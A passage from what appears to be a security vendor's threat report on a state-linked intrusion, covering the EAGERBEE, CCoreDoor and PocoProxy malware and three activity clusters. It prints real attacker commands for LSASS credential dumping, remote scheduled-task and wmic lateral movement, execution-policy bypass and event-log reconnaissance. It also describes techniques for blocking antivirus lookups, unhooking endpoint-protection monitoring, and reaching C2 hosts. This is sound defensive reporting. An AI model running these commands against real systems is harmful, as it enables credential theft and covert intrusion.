<figure id="attachment_955389" aria-describedby="caption-attachment-955389" style="width: 1200px" class="wp-caption alignnone"><a href="https://news.sophos.com/wp-content/uploads/2024/05/Slide9.jpeg"><img loading="lazy" decoding="async" class="wp-image-955389 size-full" src="https://news.sophos.com/wp-content/uploads/2024/05/Slide9.jpeg" alt="Figure 19: Diagram showing function of the observed updated EAGERBEE variants" width="1200" height="675" srcset="https://news.sophos.com/wp-content/uploads/2024/05/Slide9.jpeg 1200w, https://news.sophos.com/wp-content/uploads/2024/05/Slide9.jpeg?resize=300,169 300w, https://news.sophos.com/wp-content/uploads/2024/05/Slide9.jpeg?resize=768,432 768w, https://news.sophos.com/wp-content/uploads/2024/05/Slide9.jpeg?resize=1024,576 1024w" sizes="(max-width: 1200px) 100vw, 1200px" /></a><figcaption id="caption-attachment-955389" class="wp-caption-text">Figure 19: Diagram showing function of the observed updated EAGERBEE variants</figcaption></figure>
<p>While filtering the DNS traffic, the WinDivert driver monitors for a list of specified malware protection vendor-related sub-strings, such as domains related to ESET, Microsoft, Mcafee, Trend, and DrWeb. If the driver detects the raw DNS data to contain a specified substring, then it overwrites the packet header with zeros, thus effectively preventing DNS resolution and disabling communication with these servers. Essentially, this enables the malware to read and modify DNS packets prior to transit to prevent the systems from communicating with malware protection vendor servers.</p>
<p><em>Figure 20: Malware protection vendor strings listed in WinDivert driver embedded into TSVIPSrv.dll</em></p>
<p>Based on open-source research to identify the strings in the WinDivert driver, we assert with low to moderate confidence that the observed EAGERBEE malware aimed to disrupt network communications to the following anti-virus vendor domains:</p>
<table>
<tbody>
<tr>
<td width="129"><strong>Listed Strings</strong></td>
<td width="247"><strong>Full Domain Name</strong></td>
<td width="247"><strong>Function</strong></td>
</tr>
<tr>
<td width="129">Checkappexec.mic</td>
<td width="247">Checkappexec.microsoft.com</td>
<td width="247">Windows Defender SmartScreen reporting and notifications; turning off traffic for these endpoints will disable SmartScreen notifications</td>
</tr>
<tr>
<td width="129">networkdevice.sc</td>
<td width="247">networkdevice.scanners.eset.system</td>
<td width="247">ESET network traffic scanner</td>
</tr>
<tr>
<td width="129">Ortex.dat</td>
<td width="247">vortex.data.microsoft.com | vortex.data.microsoft.com.akadns.net</td>
<td width="247">Microsoft telemetry domain</td>
</tr>
<tr>
<td width="129">Ksn-a</td>
<td width="247">ksn-a-stat-geo.kaspersky-labs.com | ksn-a-p2p-geo.kaspersky-labs.com</td>
<td width="247">Kaspersky Security Network services</td>
</tr>
<tr>
<td width="129">Alprotect1.m</td>
<td width="247">realprotect1.mcafee.com</td>
<td width="247">McAfee cloud-based scanning</td>
</tr>
<tr>
<td width="129">on.ccs.mcaf</td>
<td width="247">provision.ccs.mcafee.com</td>
<td width="247">McAfee SafeConnect</td>
</tr>
<tr>
<td width="129">Cloud.gti.mc</td>
<td width="247">cloud.gti.mcafee.com</td>
<td width="247">McAfee Endpoint Security (ENS)</td>
</tr>
<tr>
<td width="129">Protect1.mca</td>
<td width="247">realprotect1.mcafee.com</td>
<td width="247">McAfee cloud-based scanning</td>
</tr>
<tr>
<td width="129">adownload.mcaf</td>
<td width="247">sadownload.mcafee.com</td>
<td width="247">McAfee security products update site</td>
</tr>
<tr>
<td width="129">.c.eset</td>
<td width="247">a.c.eset.com | i1.c.eset.com</td>
<td width="247">ESET LiveGrid</td>
</tr>
<tr>
<td width="129">edf.eset</td>
<td width="247">edf.eset.com</td>
<td width="247">ESET Data Framework (Anti-Theft, ESET Business Account, Parental control, Web control)</td>
</tr>
<tr>
<td width="129">Ts.eset</td>
<td width="247">ts.eset.com</td>
<td width="247">ESET Threat Lab (Suspicious file and anonymous statistical information submission)</td>
</tr>
<tr>
<td width="129">Tscreen.micros</td>
<td width="247">smartscreen.microsoft.com</td>
<td width="247">Microsoft Defender Smartscreen</td>
</tr>
<tr>
<td width="129">sn-verdi</td>
<td width="247">ksn-verdict-geo.kaspersky-labs.com</td>
<td width="247">Kaspersky Security Network services</td>
</tr>
<tr>
<td width="129">Sn-url</td>
<td width="247">ksn-url-geo.kaspersky-labs.com</td>
<td width="247">Kaspersky Security Network services</td>
</tr>
<tr>
<td width="129">Sn-cinfo</td>
<td width="247">ksn-cinfo-geo.kaspersky-labs.com</td>
<td width="247">Kaspersky Security Network services</td>
</tr>
<tr>
<td width="129">Crc.tren</td>
<td width="247">*.icrc.trendmicro.com</td>
<td width="247">Trend Micro Smart Protection Network</td>
</tr>
<tr>
<td width="129">Url.tren</td>
<td width="247">url.trendmicro.com</td>
<td width="247">Trend Micro Web Reputation Service</td>
</tr>
<tr>
<td width="129">Ensus.tren</td>
<td width="247">*census.trendmicro.com</td>
<td width="247">Trend Micro Global Census Service (Behavior monitoring and predictive machine learning)</td>
</tr>
<tr>
<td width="129">Rx.tren</td>
<td width="247">*.trx.trendmicro.com</td>
<td width="247">Trend Micro Predictive Machine Learning</td>
</tr>
<tr>
<td width="129">dev.drwe</td>
<td width="247">live.dev.drweb.com</td>
<td width="247">DrWeb signature updates – DrWeb Live Disk</td>
</tr>
<tr>
<td width="129">F2.drw</td>
<td width="247">f2.drweb.com</td>
<td width="247">DrWeb download site</td>
</tr>
</tbody>
</table>
<p>&nbsp;</p>
<p>Additionally, the <strong>TSVIPSrv.dll</strong> sample contains further functionalities, with the decompressed configuration revealing the following C2 server addresses:</p>
<ul>
<li><strong>167.116[.]30</strong></li>
<li><strong>220.202[.]143 </strong></li>
<li><strong>195.237[.]123</strong></li>
</ul>
<figure id="attachment_955546" aria-describedby="caption-attachment-955546" style="width: 640px" class="wp-caption alignnone"><a href="https://news.sophos.com/wp-content/uploads/2024/05/TSVIPSrv.dll-configuration-with-hardcoded-C2-IPs.png"><img loading="lazy" decoding="async" class="wp-image-955546 size-full" src="https://news.sophos.com/wp-content/uploads/2024/05/TSVIPSrv.dll-configuration-with-hardcoded-C2-IPs.png" alt="EAGERBEE sample (TSVIPSrv.dll) configuration with hardcoded C2 IPs" width="640" height="442" srcset="https://news.sophos.com/wp-content/uploads/2024/05/TSVIPSrv.dll-configuration-with-hardcoded-C2-IPs.png 791w, https://news.sophos.com/wp-content/uploads/2024/05/TSVIPSrv.dll-configuration-with-hardcoded-C2-IPs.png?resize=300,207 300w, https://news.sophos.com/wp-content/uploads/2024/05/TSVIPSrv.dll-configuration-with-hardcoded-C2-IPs.png?resize=768,530 768w" sizes="(max-width: 640px) 100vw, 640px" /></a><figcaption id="caption-attachment-955546" class="wp-caption-text">Figure 21: EAGERBEE sample (TSVIPSrv.dll) configuration with hardcoded C2 IPs]</figcaption></figure>
<p>Indicators of compromise for Cluster Alpha can be found on the Sophos GitHub page <a href="https://github.com/sophoslabs/IoCs/blob/master/crimson_palace_stac1248-alpha.csv">here.</a></p>
<h1 id="cluster-bravo">Cluster Bravo (STAC1870)</h1>
<h2 id="b-discovery">Discovery</h2>
<h4>Ping Requests</h4>
<p>During the three-week intrusion period, the actor executed various discovery commands and pinged numerous internal hosts, government domains, and even Sophos-related domains. Specifically, Sophos consistently observed the actor performing a single ping instead of the default three and cleaning up netbios sessions using:</p>
<ul>
<li>“<strong><em>net use * /del /y</em></strong>”.</li>
<li><strong>ping -n 1 t1.sophosupd.com</strong></li>
</ul>
<p>During this internal discovery, the actor was seen verifying connectivity to two related government departments within the same country. One of the departments in particular ranks as a high target of interest for the Chinese government, as it aligns with <a href="https://www.undp.org/china/publications/issue-brief-chinas-14th-five-year-plan">China’s 5-year plan</a> and ambitions to claim natural resources in the South China Sea outside the internationally recognized border.</p>
<h4>Discovery commands and tools</h4>
<p>The CCoreDoor backdoor deployed in Cluster Bravo executed various discovery commands, including <strong>whoami, ipconfig /all, nbstat –an &lt;IP&gt;, tracert-d-h 3 &lt;IP&gt;, query u, netstat –ano, tasklist /v, net use, </strong>and <strong>net view /all \\&lt;server&gt;.</strong></p>
<p>The actor was also observed using <strong>mscorsvw.exe</strong> in <strong>‘AppData’</strong> to execute PowerShell script <strong>3.ps1</strong> containing <strong>EvtxParser.exe</strong>, which is a tool used to extract and analyze Windows Event Log (<strong>.evtx</strong>) files. The execution of <strong>3.ps1</strong> triggered the Sophos detection <strong>‘Xsh/dnObfus-A’</strong> for a packed sample, which blocked the script’s execution.</p>
<pre>powershell -ep bypass -f 3.ps1</pre>
<h2 id="b-creds">Credential Access</h2>
<h4>LSASS Memory Dump</h4>
<p>On the first day of observed Cluster Bravo activity, the command <strong><em>“rdrleakdiag.exe /p 696 /o C:\\programdata\\log /fullmemdmp /wait 1” </em></strong>was run to dump the LSASS process. <strong>Rdrleakdiag.exe </strong>is a Microsoft Windows resource leak diagnostic tool and a <a href="https://lolbas-project.github.io/lolbas/Binaries/Rdrleakdiag/">documented</a> LOLbin.</p>
<h2 id="b-lateral">Lateral Movement</h2>
<h4>Using valid accounts for privilege escalation</h4>
<p>After the actor had established SYSTEM-level privileges on their beachhead host, they generated secondary C2 sessions with specific administrator accounts to automate deployments and move laterally to other remote servers.</p>
<p>In addition to using valid accounts, the actor leveraged their CCoreDoor implants for both internal lateral movement and external C2 communications via two primary execution methods</p>
<h4>Moving laterally via single session execution of CCoreDoor</h4>
<p>&nbsp;</p>
<figure id="attachment_955396" aria-describedby="caption-attachment-955396" style="width: 1200px" class="wp-caption alignnone"><a href="https://news.sophos.com/wp-content/uploads/2024/05/Slide2.jpeg"><img loading="lazy" decoding="async" class="wp-image-955396 size-full" src="https://news.sophos.com/wp-content/uploads/2024/05/Slide2.jpeg" alt="Figure 22: The threat actor used two different approaches(single session execution and persistent execution) to deploy CCoreDoor implants for lateral movement and external C2 communications.  Above, the methods used to run single-execution deployment of the implants." width="1200" height="675" srcset="https://news.sophos.com/wp-content/uploads/2024/05/Slide2.jpeg 1200w, https://news.sophos.com/wp-content/uploads/2024/05/Slide2.jpeg?resize=300,169 300w, https://news.sophos.com/wp-content/uploads/2024/05/Slide2.jpeg?resize=768,432 768w, https://news.sophos.com/wp-content/uploads/2024/05/Slide2.jpeg?resize=1024,576 1024w" sizes="(max-width: 1200px) 100vw, 1200px" /></a><figcaption id="caption-attachment-955396" class="wp-caption-text">Figure 22: The threat actor used two different approaches(single session execution and persistent execution) to deploy CCoreDoor implants for lateral movement and external C2 communications.  Above, the methods used to run single-execution deployment of the implants.</figcaption></figure>
<p><em> </em></p>
<p>In most cases of single session execution, the actor copied and renamed the legitimate <strong>mscorsvw.exe</strong> (<strong>Licensing.exe</strong> | <strong>Packages.exe </strong>| <strong>Systemconfig.exe</strong>) with a malicious <strong>.vbs</strong> script from an expected directory to <strong>‘C:\ProgramData’</strong>. The actor created several scheduled tasks throughout the intrusion to execute the renamed <strong>mscorsvw.exe</strong> binary and sideload the malicious <strong>mscorsvc.dll</strong> (CCoreDoor) onto different machines. The scheduled tasks were either set with a run schedule of ‘once’ or run manually after creation before being deleted immediately.</p>
<pre>schtasks /create /tn "microsoft" /sc once /ru system /s 172.xx.xxx.xx /st 13:49:00 /tr "c:\Programdata\Packages\Packages.exe"</pre>
<p>However, Sophos MDR hunters observed variations in how the CCoreDoor implants were executed throughout the intrusion, indicating the actor was using similar but slightly changing methods to execute their payload in an obfuscated manner. These variations included:</p>
<ul>
<li>Using WScript to run a vbscript (<strong>vbs | 3.vbs</strong>) that executed the backdoor on various systems</li>
</ul>
<pre>C:\Windows\system32\cmd.exe /C "wscript.exe c:\programdata\3.vbs"
wscript.exe  c:\programdata\3.vbs</pre>
<ul>
<li>Using valid accounts to create the service <strong>‘ntauthcmd’ </strong>on a remote server to run <strong>vbs</strong> from WScript, which executed the backdoor</li>
</ul>
<pre>sc \\172.xx.xxx.xx create ntauthcmd binpath= "c:\windows\system32\wscript.exe C:\programdata\r.vbs" type= own</pre>
<ul>
<li>Using <strong>wmic process call create</strong> to execute the sideloaded CCoreDoor backdoor, with no .vbs script involvement</li>
</ul>
<pre>wmic /node:172.xx.xxx.xx process call create "c:\Programdata\Packages\Packages.exe</pre>
<h2 id="b-persist">Persistence/ Privilege Escalation</h2>
<figure id="attachment_955395" aria-describedby="caption-attachment-955395" style="width: 640px" class="wp-caption alignnone"><a href="https://news.sophos.com/wp-content/uploads/2024/05/Slide3.jpeg"><img loading="lazy" decoding="async" class="wp-image-955395 size-full" src="https://news.sophos.com/wp-content/uploads/2024/05/Slide3.jpeg" alt=" Diagram illustrating persistent execution method used by the threat actor to deploy CCoreDoor implants for lateral movement and external C2 communications" width="640" height="360" srcset="https://news.sophos.com/wp-content/uploads/2024/05/Slide3.jpeg 1200w, https://news.sophos.com/wp-content/uploads/2024/05/Slide3.jpeg?resize=300,169 300w, https://news.sophos.com/wp-content/uploads/2024/05/Slide3.jpeg?resize=768,432 768w, https://news.sophos.com/wp-content/uploads/2024/05/Slide3.jpeg?resize=1024,576 1024w" sizes="(max-width: 640px) 100vw, 640px" /></a><figcaption id="caption-attachment-955395" class="wp-caption-text">Figure 23: The method used by the threat actor to deploy persistent  CCoreDoor implants for lateral movement and external C2 communications.</figcaption></figure>
<h4>Persistent C2 via scheduled tasks</h4>
<p>For persistent execution, the actor copied the benign <strong>mscorsvw.exe </strong>and the malicious <strong>mscorsvc.dll (CCoreDoor)</strong> to <strong>&#8216;C:\Users\Administrator\Appdata\Roaming’</strong> before creating a batch script (<strong>3.bat</strong>) to initiate the backdoor. Sophos MDR then observed CCoreDoor establishing external communications to attacker C2 <strong>message.ooguy[.]com (146.190.93[.]250) </strong>and creating a scheduled task as SYSTEM for persistent C2 execution. Dormant C2 communications via DNS requests and TCP network connections continued for approximately two days.</p>
<pre>schtasks /create /ru system /sc MINUTE /mo 300 /tn "microsoft\windows\SystemTemps" /tr "c:\users\administrator\appdata\roaming\mscorsvw.exe" /F

schtasks /run /tn "microsoft\windows\SystemTemps"</pre>
<p>After the two days, the actor ran another scheduled task as a compromised domain administrator, which initiated single-session executions of CCoreDoor for internal lateral movement.</p>
<pre>schtasks /create /ru &lt;Active Directory Domain&gt;\&lt;user&gt;/sc MINUTE /mo 1 /tn "microsoft\windows\SystemTemps" /tr "c:\users\administrator\appdata\roaming\mscorsvw.exe" /F</pre>
<p>In instances where single-session executions of CCoreDoor were used for lateral movement, the scheduled tasks and malicious DLL were deleted directly after the sessions. However, when CCoreDoor was used for persistent C2 communications, the task was left running.</p>
<h2 id="b-c2">C2</h2>
<h4>CCoreDoor Backdoor</h4>
<p>CCoreDoor (<strong>mscorsvc.dll</strong>) is a simple backdoor used to move laterally, establish external C2 communications, run discovery commands, and perform an LSASS memory dump.</p>
<p>In their analysis, Sophos Labs identified two threads of background tasks created by the backdoor. The first thread establishes C2 communications by decrypting [<strong>base64 + sub(6)</strong>] a host name and port (<strong>message.ooguy[.]com:443</strong>) and connecting to it by calling <strong>CCoreManager::StartWorkThread.</strong> The second thread aims to ensure the backdoor activity is hidden by rapidly enumerating all windows every 100 milliseconds and hiding the one that belongs to itself.</p>
<pre>[172.xx.x.xxx]:61222 -&gt; [146.190.93.250]:443 request: message.ooguy[.]com</pre>
<p><em>Commands supported by CCoreDoor:</em></p>
<table>
<tbody>
<tr>
<td width="312"><strong>Command</strong></td>
<td width="312"><strong>Purpose</strong></td>
</tr>
<tr>
<td width="312">exit</td>
<td width="312">Exits by leaving command dispatcher</td>
</tr>
<tr>
<td width="312">quit</td>
<td width="312">Exits by leaving command dispatcher</td>
</tr>
<tr>
<td width="312">uninstall</td>
<td width="312">Stops service and deletes itself</td>
</tr>
<tr>
<td width="312">exitex</td>
<td width="312">Calls ExitProcess</td>
</tr>
<tr>
<td width="312">plugin</td>
<td width="312">Executes command line received from the server; Calls CCoreManager::ShellAction and CCoreManager::CreateThread</td>
</tr>
</tbody>
</table>
<h2 id="b-evade"> Defense Evasion</h2>
<h4>System hooks bypassed by overwriting of ntdll.dll in memory</h4>
<p>In March, activity in Cluster Bravo was observed rapidly creating, deleting, and modifying <strong>ntdll.dll </strong>(renamed <strong>ntpsapi.dll</strong>) at least 19 times in one minute. As documented by <a href="https://www.ired.team/offensive-security/defense-evasion/how-to-unhook-a-dll-using-c++">ired.team,</a> this technique is used to unhook the Sophos endpoint protection agent process from the kernel by overwriting <strong>ntdll.dll</strong> in memory with an on-disk version. By using the legitimate version as a source for the copy, this tactic prevents the in-memory version from being corrupted and crashing the system.</p>
<p>Indicators of compromise for Cluster Bravo can be found on the Sophos GitHub page <a href="https://github.com/sophoslabs/IoCs/blob/master/crimson_palace_stac1870_bravo.csv">here.</a></p>
<h1 id="cluster-charlie">Cluster Charlie (STAC1305)</h1>
<h2 id="c-discovery">Discovery</h2>
<h3>Targeted User Reconnaissance</h3>
<p>Discovery activities in Cluster Charlie peaked on a morning in June 2023—a holiday—when the actor began to conduct some of their noisiest activity, including mass analysis of event logs for network-wide user and network reconnaissance and ping sweeps of over 1800 machines. On that morning, Sophos observed the actor using a <strong>.bat</strong> file to execute discovery commands before they switched to a command session from a newly deployed PocoProxy instance (<strong>chrome.log</strong>) to execute <strong>wevtutil </strong>commands and conduct specific reconnaissance on more than 120 domain users.</p>
<pre>C:\Windows\SYSTEM32\cmd.exe /c ""c:\perflogs\4.bat"" &gt;&gt; wevtutil  qe security /rd:true /f:text /q:"*[System/EventID=4624 and 4628] and *[EventData/Data[@Name='TargetUserName']='&lt;redacted&gt;']" /c:20</pre>
<p>After this initial activity, the actor moved laterally via remote scheduled tasks to another domain controller and used a different PocoProxy implant (<strong>4413.txt</strong>) to run the same <strong>wevtutil </strong>commands, but with the addition of administrator credentials.</p>
<pre>wevtutil e security /rd:true /f:text /q:"*[System/EventID=4624 and 4628] and *[EventData/Data[@Name='TargetUserName']='user']" /c:20 /r:&lt;server&gt; /u:&lt;user&gt; /p:"&lt;password&gt;"</pre>
<p>In the discovery commands executed from the PocoProxy implants, Sophos MDR hunters observed a potential typo (<strong>4628</strong>) in the automation script to query for <strong>4628 </strong>event IDs, which has no known functionality.</p>
<p>Two days later, the actor continued to collect event logs, but instead leveraged the Impacket module Atexec to retrieve the security logs of specific users to export them to <strong>wmpwk.mof</strong>.</p>
<pre>powershell.exe  -exec bypass -Command " Get-EventLog -LogName Security -After '2022/06/01 00:00' | Where-Object {$_.eventid -eq 4624 -and $_.Message-like '*&lt;USER&gt;*'} | Format-List|out-file -filepath C:\Windows\System32\wbem\wmpwk.mof"</pre>
<p>Following these discovery commands, <strong>4413.txt </strong>executed the following command to create a compressed archive file of all <strong>.txt</strong> files in the current directory.</p>
<pre>rar.dat  a -m5 ff.rar *.txt\</pre>
<h3>Ping Sweeps</h3>
<p>Using the IP addresses collected in the 4624 Event Log discovery, the threat actor conducted automated ping sweeps across the network in sequential six-minute intervals intermitted by equal length pauses.</p>
<p>In a later attempt, the ping sweep appeared to contain an element of broken scripting, resulting in only 814 pings succeeding and the remaining 931 using &#8216;<strong>ping  -n 1 %I&#8217; </strong>to fail. Based on the volume and length of activity and the fact that large portions of the host addresses pinged were sequential, we assess with high confidence the actor was attempting to map all endpoints in the network.</p>
<h2 id="c-creds">Credential Access</h2>
<p><em>Prior access to valid credentials</em></p>
<p>Evidence indicates the actor in Cluster Charlie had prior access to valid credentials through unknown means, as Sophos MDR observed the actor leveraging two different administrator accounts in March to test the capabilities of their C2 implants. The first compromised account leveraged Telnet (telnet.exe) to test connectivity to C2 infrastructure, while the second was used via the Windows “<strong>runas” </strong>command to establish persistence for one of their PocoProxy implants.</p>
<h3>Abusing McAfee File Lock to sideload LSASS credential interceptor</h3>
<p>At the end of July, Sophos hunters observed a PocoProxy sample (<strong>4413.txt</strong>) execute a McAfee File Lock executable (<strong>McPvTray.exe</strong>) to sideload <strong>C:\Users\Public\McPvNs.dll.</strong> This sideload was attempted multiple times over several hours but appeared to fail as the actor ran various discovery commands to locate the executable.</p>
<pre>tasklist
findstr  McPvTray.exe
findstr  mcafee
findstr  Agent
wmic  process get name,executablepath</pre>
<p>Shortly after, the file <strong>C:\users\public\Libraries\11.log</strong> was created on disk, leading us to assess with moderate confidence the McAfee executable sideload attempt was an effort to load an LSASS credential interceptor (11.log). Sophos Labs analysts determined the <strong>11.log </strong>file hooks the <strong>SpAcceptCredentials </strong>function to dump captured credentials to <strong>user.log</strong>, which was observed containing the output of cleartext credentials briefly after <strong>11.log</strong> was created on the system.</p>
<h2 id="c-lateral">Lateral Movement</h2>
<p>Overall, the actor in Cluster Charlie was quite methodical in expanding access across the target network. In addition to using valid accounts, they were often observed simultaneously connecting to multiple domain controllers from a C2 implant to infect new victim machines. This method of expansion allowed for more cover within the noise of regular domain controller traffic, as opposed to client-to-client traffic that doesn’t blend in as well.</p>
<h3>Scheduled task creation for lateral tool transfer</h3>
<p>The actor in Cluster Charlie occasionally used scheduled tasks for lateral movement, such as on June 12 when the <strong>4413.txt</strong> sample created a task using compromised admin credentials to launch another PocoProxy implant (<strong>a8.txt</strong>) on a new target system.</p>
<pre>schtasks  /Create   /S 172.xx.xxx.xx /U &lt;redacted&gt;.local\&lt;username&gt; /P "&lt;password&gt;" /RU system /sc onstart /TN "\Microsoft\Windows\config_bk111" /TR " c:\windows\system32\rundll32.exe c:\perflogs\a8.txt,Update" /F</pre>
<p>Sophos MDR hunters also recovered a custom binary called <strong>hideschtasks.exe</strong> that functions to remotely create scheduled tasks and execute commands to the ATSVC named pipe (<a href="https://github.com/fortra/impacket/blob/97007e841d1db25b884d2daf67e25e1a17f6095a/examples/atexec.py#L62)."><strong>ncacn_np: \pipe\atsvc</strong></a>).</p>
<h3>Lateral movement via WinRS</h3>
<p>In August, the threat actor began to use WinRS for discovery and lateral movement to additional endpoints. To do so, the actor copied their malware to new systems via SMB shares and used remote scheduled task creation to execute it. The attacker also proxied <strong>wmic </strong>execution through WinRS, which is not typically seen and serves as a great threat hunt candidate on its own.</p>
<pre>C:\WINDOWS\system32\cmd.exe /C for /f %i in (33.txt) do ping -n 1 %i &gt;&gt; rr.txt
C:\WINDOWS\system32\cmd.exe /C net use \\&lt;IP&gt;\c$ /u:&lt;redacted&gt;    "&lt;redacted&gt;"
C:\WINDOWS\system32\cmd.exe /C schtasks /Create /S &lt;IP&gt; /U &lt;redacted&gt;    /P "&lt;redacted&gt;"  /RU system /SC ONCE /ST 12:02 /TN test4 /TR "c:\users\public\2.bat" /F
C:\WINDOWS\system32\cmd.exe /C wmic /node:&lt;IP&gt; /user:&lt;redacted&gt; /password:"&lt;redacted&gt;" get name,executablepath &gt;&gt; de.txt</pre>
<h2 id="c-persist">Persistence/ Privilege Escalation</h2>
<h3>Rotating C2 Infrastructure and Scheduled Tasks</h3>
<p>The actor in Cluster Charlie highly prioritized persistent access to target systems throughout the intrusion and deployed several malware implants to establish redundant lines of C2 communications to attacker-controlled IPs. For additional persistence, multiple scheduled tasks were created to enable repeated execution of the PocoProxy payloads. In some cases, the tasks were run manually, while others were set to trigger upon system restart.</p>
<pre>schtasks  /Create   /RU &lt;redacted&gt;.local\\&lt;redacted&gt; /sc onstart  /TN \"\\Microsoft\\Windows\\config3\"  /TR \"cmd /c c:\\windows\\system32\\rundll32.exe c:\\windows\\vss\\writers\\application\\443.txt,Update\" /F

schtasks  /Create    /RU system /sc onstart /TN "\Microsoft\Windows\config_bk1" /TR " c:\windows\system32\rundll32.exe c:\windows\vss\writers\application\4413.txt,Update" /F</pre>
<h3>Runas for Privilege Escalation</h3>
<p>To escalate privileges while evading detection, the actor often used <strong>runas </strong>to run commands in the context of a different user, allowing them to execute commands with administrator privileges.</p>
<pre>"runas  /env /user:&lt;redacted&gt; "c:\windows\system32\rundll32.exe c:\windows\vss\writers\application\443.txt,Update""</pre>
<h2 id="c-c2">C2</h2>
<h3>PocoProxy Malware</h3>
<p>In investigating Cluster Charlie activity, Sophos MDR hunters uncovered at least five samples of a previously unidentified malware executed under different file names. This malware, which we have dubbed PocoProxy, has the capability to execute shell commands, inject payloads into elevated processes, and scan processes to find <strong>Explorer.exe</strong>. PocoProxy operates in either <strong>Listen </strong>or <strong>Connect </strong>mode, with a third switch to set the Proxy address. Each switch receives an additional parameter of a server address:</p>
<ul>
<li><strong>Listen </strong>(overwrites <strong>listen_URL</strong> string with updated URL)</li>
<li><strong>Proxy </strong>(used in combination with <strong>-listen</strong>, overwrites <strong>proxy_host</strong> string with updated URL)</li>
<li><strong>Connect </strong>(overwrites <strong>connect_URL </strong>string with updated URL)</li>
</ul>
<figure id="attachment_955547" aria-describedby="caption-attachment-955547" style="width: 640px" class="wp-caption alignnone"><a href="https://news.sophos.com/wp-content/uploads/2024/05/PocoProxy-sample-assembly-code-showing-command-loop.png"><img loading="lazy" decoding="async" class="size-full wp-image-955547" src="https://news.sophos.com/wp-content/uploads/2024/05/PocoProxy-sample-assembly-code-showing-command-loop.png" alt="PocoProxy sample assembly code showing command loop" width="640" height="345" srcset="https://news.sophos.com/wp-content/uploads/2024/05/PocoProxy-sample-assembly-code-showing-command-loop.png 1201w, https://news.sophos.com/wp-content/uploads/2024/05/PocoProxy-sample-assembly-code-showing-command-loop.png?resize=300,162 300w, https://news.sophos.com/wp-content/uploads/2024/05/PocoProxy-sample-assembly-code-showing-command-loop.png?resize=768,414 768w, https://news.sophos.com/wp-content/uploads/2024/05/PocoProxy-sample-assembly-code-showing-command-loop.png?resize=1024,552 1024w" sizes="(max-width: 640px) 100vw, 640px" /></a><figcaption id="caption-attachment-955547" class="wp-caption-text">Figure 24: PocoProxy sample assembly code showing command loop</figcaption></figure>
<figure id="attachment_955548" aria-describedby="caption-attachment-955548" style="width: 640px" class="wp-caption alignnone"><a href="https://news.sophos.com/wp-content/uploads/2024/05/PocoProxy-sample-assembly-code-assigning-new-‘Connect-and-‘Listen-URLs.png"><img loading="lazy" decoding="async" class="size-full wp-image-955548" src="https://news.sophos.com/wp-content/uploads/2024/05/PocoProxy-sample-assembly-code-assigning-new-‘Connect-and-‘Listen-URLs.png" alt="PocoProxy sample assembly code assigning new ‘Connect’ and ‘Listen’ URLs" width="640" height="138" srcset="https://news.sophos.com/wp-content/uploads/2024/05/PocoProxy-sample-assembly-code-assigning-new-‘Connect-and-‘Listen-URLs.png 1222w, https://news.sophos.com/wp-content/uploads/2024/05/PocoProxy-sample-assembly-code-assigning-new-‘Connect-and-‘Listen-URLs.png?resize=300,65 300w, https://news.sophos.com/wp-content/uploads/2024/05/PocoProxy-sample-assembly-code-assigning-new-‘Connect-and-‘Listen-URLs.png?resize=768,165 768w, https://news.sophos.com/wp-content/uploads/2024/05/PocoProxy-sample-assembly-code-assigning-new-‘Connect-and-‘Listen-URLs.png?resize=1024,220 1024w" sizes="(max-width: 640px) 100vw, 640px" /></a><figcaption id="caption-attachment-955548" class="wp-caption-text">Figure 25: PocoProxy sample assembly code assigning new ‘Connect’ and ‘Listen’ URLs</figcaption></figure>
<p><em>Figure 25:PocoProxy sample assembly code assigning new ‘Connect’ and ‘Listen’ URLs</em></p>
<p>The name PocoProxy derives from how the malware embeds and leverages <a href="https://docs.pocoproject.org/current/Poco.Net.HTTPClientSession.ProxyConfig.html"><strong>poco::net </strong>SSL libraries</a> for C2 communications and to create network proxies. Though we were unable to find public reporting on this malware, Sophos Labs identified several samples of PocoProxy on VirusTotal ranging back to 2018.</p>
<p><em><a href="https://news.sophos.com/wp-content/uploads/2024/05/Slide10.jpeg"><img loading="lazy" decoding="async" class="alignnone size-full wp-image-955388" src="https://news.sophos.com/wp-content/uploads/2024/05/Slide10.jpeg" alt="" width="640" height="360" srcset="https://news.sophos.com/wp-content/uploads/2024/05/Slide10.jpeg 1200w, https://news.sophos.com/wp-content/uploads/2024/05/Slide10.jpeg?resize=300,169 300w, https://news.sophos.com/wp-content/uploads/2024/05/Slide10.jpeg?resize=768,432 768w, https://news.sophos.com/wp-content/uploads/2024/05/Slide10.jpeg?resize=1024,576 1024w" sizes="(max-width: 640px) 100vw, 640px" /></a>Figure 26: Diagram showing timeline of deployment for PocoProxy samples and their C2 connections</em></p>
<h3>Sample 1: 443.txt</h3>
<p>The first PocoProxy sample (<strong>443.txt</strong>) was deployed in March when the actor used a valid administrator account to run a scheduled task to execute <strong>443.txt</strong> via <strong>rundll32.exe</strong>, which generated C2 communications from the PocoProxy implant to the C2 IP <strong>198.13.47[.]158. </strong>The actor continued to leverage <strong>443.txt </strong>for C2 as they moved laterally throughout March and April.</p>
<pre>schtasks  /Create   /RU &lt;Redacted&gt; \&lt;username&gt; /sc onstart  /TN "\Microsoft\Windows\config3"  /TR "c:\windows\system32\rundll32.exe c:\windows\vss\writers\application\443.txt,Update" /F</pre>
<h3>Sample 2: 4413.txt (Primary)</h3>
<p>In May, a second PocoProxy sample was observed (<strong>4413.txt</strong>) as the actor repeated the process of running a scheduled task for persistence. Upon execution, <strong>4413.txt</strong> became the primary implant and began to establish connections to C2 IP <strong>64.176.50[.]42 </strong>on several endpoints.</p>
<pre>schtasks  /Create    /RU system /sc onstart /TN "\Microsoft\Windows\config_bk1" /TR " c:\windows\system32\rundll32.exe c:\windows\vss\writers\application\4413.txt,Update" /F</pre>
<h3>Sample 3: Chrome.log</h3>
<p>While continuing to execute <strong>4413.txt</strong>, the threat actor deployed an additional PocoProxy implant named <strong>chrome.log</strong>, which was executed to establish C2 communications to <strong>158.247.241[.]188</strong>. After moving laterally to a domain controller, <strong>chrome.log</strong> was executed via <strong>rundll32.exe</strong> and spawned command sessions to run reconnaissance commands on hundreds of users.</p>
<pre>c:\windows\system32\rundll32.exe c:\perflogs\chrome.log,Update</pre>
<h3>Sample 4: Aaaa.txt</h3>
<p>On the same day, the threat actor was observed dropping a fourth PocoProxy sample (<strong>aaaa.txt) </strong>on additional systems to connect to the same C2 IP <strong>158.247.241[.]188</strong>. This sample was also seen making DNS requests to known malicious domain <strong>www.googlespeedtest33[.]com</strong>.</p>
<h3>Sample 5: A8.txt</h3>
